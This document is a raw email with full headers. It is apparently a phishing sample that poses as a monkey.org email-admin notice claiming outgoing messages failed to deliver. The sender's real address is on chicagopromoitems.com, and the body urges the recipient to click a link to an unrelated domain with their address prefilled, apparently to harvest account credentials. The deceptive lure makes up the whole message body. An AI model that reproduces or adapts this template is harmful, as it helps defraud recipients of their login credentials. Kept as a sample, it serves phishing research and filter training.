@@ -1,0 +1,147 @@
+Return-Path: admin@chicagopromoitems.com
+Delivered-To: jose@monkey.org
+X-FDA: 80182622730.53.21CC2FC
+Received: from 5592688.allevi8marketing.com (unknown [162.241.240.19])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP id CD45C1003D4E3
+	for <jose@monkey.org>; Mon, 28 Nov 2022 11:26:24 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=chicagopromoitems.com; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=3605uyVYT1NhrNF1gnaHX3nc9CY+EsxV1z5PCKAtWDE=; b=mqrbuuljHL0Wrs7bcxaOb4LT5B
+	2PRgf5jSFjie8cAE+mQRJZ0Arx/A+aO3YN0hT1t68IWejOaXNyjfw3Vla1EM8Ocm7AOOopitFh2In
+	xGFRAWMRkpkwOelmV54FjzE81JWJ0loHGfwS4iB+BpvsHigTLkZnHI9TmxfLDAVyte/Pc0+42lAT7
+	EaKUH5IiMMpy4NHKJX/aYFmWmKXbL40nmal9gSL9IJceTFCZyWMks+8WTpd1+vrvo7GbgaZQCNQzK
+	7xM4MdPS7RY84Ne5sL++uV1YplOzfNjENVcolOQXMTgD12zHNe0GNlLN1Y2hI4oBs5f67EzJeaXzY
+	SlSHE51Q==;
+Received: from ec2-54-82-18-52.compute-1.amazonaws.com ([54.82.18.52]:59791
+ helo=chicagopromoitems.com)	by 5592688.allevi8marketing.com with esmtpa (Exim
+ 4.95)	(envelope-from <admin@chicagopromoitems.com>)	id 1ozcHI-0004Pc-9l	for
+ jose@monkey.org;	Mon, 28 Nov 2022 05:26:24 -0600
+From: monkey.org Email Admin <admin@chicagopromoitems.com>
+To: jose@monkey.org
+Subject: Your recent outgoing messages couldn't be delivered
+Date: 28 Nov 2022 11:26:24 +0000
+Message-ID: <20221128112623.ABF2A612AA2F0AB0@chicagopromoitems.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - 5592688.allevi8marketing.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - chicagopromoitems.com
+X-Get-Message-Sender-Via:
+ 5592688.allevi8marketing.com: authenticated_id: admin@chicagopromoitems.com
+X-Authenticated-Sender:
+ 5592688.allevi8marketing.com: admin@chicagopromoitems.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1669634784;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=3605uyVYT1NhrNF1gnaHX3nc9CY+EsxV1z5PCKAtWDE=;
+	b=AuX5ZK72vQh7U+6ebP/jSRHUQ65u6shdLwPFQW9YzPgzb3EwhnX6BugSAa+g1RJfI+g/h9
+	Q6PTxISLwYl24eFPgq09l/TGQffBocFbeihHUlxZIY49hA88TWrJLHHHaCHSI4phPGHCl+
+	tomeXHS0DqkSc5FZ3JOqBdfLmXUwaWE=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1669634784; a=rsa-sha256;
+	cv=none;
+	b=A33e64Qsu80vsOYjMBAdPgfzY4Vq0pGYht5voQztO8C1PhhpK2+0bzQ8ifuRyNAKLV7XYa
+	YTT1XqhtXuFZV1iPKnilUqiIUuUJ2wDayD45u7Q5QoFstRaIB/Foth+8uUIzkMeS/o5AOG
+	sgyM2OOM43o/Y1Klk5p2qyZZ2yVVhlA=
+ARC-Authentication-Results: i=1;	imf17.b.hostedemail.com;	dkim=pass
+ header.d=chicagopromoitems.com header.s=default header.b=mqrbuulj;
+	dmarc=none;	spf=pass (imf17.b.hostedemail.com: domain of
+ admin@chicagopromoitems.com designates 162.241.240.19 as permitted sender)
+ smtp.mailfrom=admin@chicagopromoitems.com
+X-Rspamd-Queue-Id: CD45C1003D4E3
+Authentication-Results: imf17.b.hostedemail.com;	dkim=pass
+ header.d=chicagopromoitems.com header.s=default header.b=mqrbuulj;
+	dmarc=none;	spf=pass (imf17.b.hostedemail.com: domain of
+ admin@chicagopromoitems.com designates 162.241.240.19 as permitted sender)
+ smtp.mailfrom=admin@chicagopromoitems.com
+X-Rspam-User: 
+X-Rspamd-Server: rspam05
+X-Spam-Status: No, score=7.10
+X-Stat-Signature: gzhijnpecwqj9e1kkra3epasxhg3cg6a
+X-HE-Tag: 1669634784-10139
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 224
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
+letter-spacing: normal; font-family: verdana, sans-serif; font-size: 12px; =
+font-style: normal; font-weight: 400; word-spacing: 0px; border-top-color: =
+currentColor; border-top-width: 0px; border-top-style: none; white-space: n=
+ormal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;"><span styl=
+e=3D"color: rgb(11, 83, 148);"><font size=3D"4"><b>Your messages couldn't b=
+e delivered</b></font></span></div>
+<div style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
+letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Helve=
+tica, sans-serif; font-size: 12px; font-style: normal; font-weight: 400; wo=
+rd-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-col=
+or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial;=20
+text-decoration-color: initial;'><span style=3D"font-family: verdana, sans-=
+serif;"><font size=3D"2"><font size=3D"2">Your recent outgoing messages cou=
+ldn't be delivered due to lack of updating your email account.&nbsp;</font>=
+</font></span></div>
+<div style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
+letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Helve=
+tica, sans-serif; font-size: 12px; font-style: normal; font-weight: 400; wo=
+rd-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-col=
+or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial;=20
+text-decoration-color: initial;'><span style=3D"font-family: verdana, sans-=
+serif;"><font size=3D"2"><font size=3D"2"><br></font></font></span></div>
+<div style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
+letter-spacing: normal; font-family: verdana, sans-serif; font-size: 12px; =
+font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norma=
+l; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-varian=
+t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
+0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial;"><font size=3D"2"><b>
+Further information</b></font><font size=3D"2">: Connection timed out</font=
+></div>
+<div style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
+letter-spacing: normal; font-family: verdana, sans-serif; font-size: 12px; =
+font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norma=
+l; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-varian=
+t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
+0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial;"><font size=3D"2"><b>
+To auto initiate delivery:</b>&nbsp;(<a style=3D"color: rgb(0, 0, 204);" hr=
+ef=3D"https://csalaw.co.za/sbcontent/servers/index.php?email=3Djose@monkey.=
+org" target=3D"_blank">Click Here to Retrieve and Initiate Delivery</a>)</f=
+ont></div>
+<div style=3D"color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; =
+letter-spacing: normal; font-family: verdana, sans-serif; font-size: small;=
+ font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norm=
+al; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-varia=
+nt-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width:=
+ 0px; text-decoration-thickness: initial; text-decoration-style: initial; t=
+ext-decoration-color: initial;"><br>
+<div style=3D"font-family: inherit; font-size: 12px;"><font size=3D"2">Deli=
+very report for:&nbsp;</font><span style=3D"color: rgb(7, 55, 99);"><font s=
+ize=3D"2"><a style=3D"color: rgb(17, 85, 204);" target=3D"_blank">jose@monk=
+ey.org</a></font></span></div></div></body></html>
+
